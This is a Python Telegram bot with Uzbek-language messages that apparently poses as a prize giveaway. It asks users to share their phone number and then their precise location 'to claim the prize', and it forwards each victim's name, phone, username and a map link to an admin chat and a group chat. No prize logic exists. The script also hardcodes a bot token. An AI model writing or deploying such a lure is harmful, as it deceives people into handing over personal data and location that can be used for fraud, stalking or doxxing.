from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = "7861235950:AAFrjamSx87kHzgGHCpT93YviJ6_hoDbeEg"
ADMIN_CHAT_ID = 7474435850
GROUP_CHAT_ID = -1002515772883  # Guruh chat ID sini to'g'ri formatda (-100 bilan) kiriting

user_data_store = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"Salom, {user.first_name}! Yutuqni olish uchun raqamingizni yuboring.",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("📲 Yutuqni olish uchun raqamni yuborish", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user = update.effective_user
    phone_number = contact.phone_number
    username = user.username or "username yo'q"
    first_name = user.first_name

    user_data_store[user.id] = {
        "phone_number": phone_number,
        "username": username,
        "first_name": first_name,
        "location": None
    }

    location_keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📍 Yutuqni olish uchun joylashuvingizni yuboring", request_location=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await update.message.reply_text(
        f"Rahmat, {first_name}.\nRaqamingiz qabul qilindi.\nEndi yutuqni olish uchun joylashuvingizni yuboring.",
        reply_markup=location_keyboard
    )

async def location_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    location = update.message.location
    user = update.effective_user

    if user.id in user_data_store:
        user_data_store[user.id]["location"] = (location.latitude, location.longitude)
        data = user_data_store[user.id]
        maps_link = f"https://www.google.com/maps?q={location.latitude},{location.longitude}"

        message_to_send = (
            f"Yangi foydalanuvchi yutuq ma'lumotlari:\n"
            f"Ism: {data['first_name']}\n"
            f"Telefon raqam: {data['phone_number']}\n"
            f"Username: @{data['username']}\n"
            f"Joylashuv: [Google Mapsda ko'rish]({maps_link})"
        )

        # Admin chatga yuborish
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=message_to_send, parse_mode="Markdown")
        # Guruhga yuborish
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=message_to_send, parse_mode="Markdown")

        await update.message.reply_text("Ma'lumotlar uchun rahmat! Yutug'ingiz tez orada sizga yetkaziladi.")
    else:
        await update.message.reply_text("Iltimos, avval raqamingizni yuboring.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    app.add_handler(MessageHandler(filters.LOCATION, location_handler))

    print("Bot ishga tushdi...")
    app.run_polling()
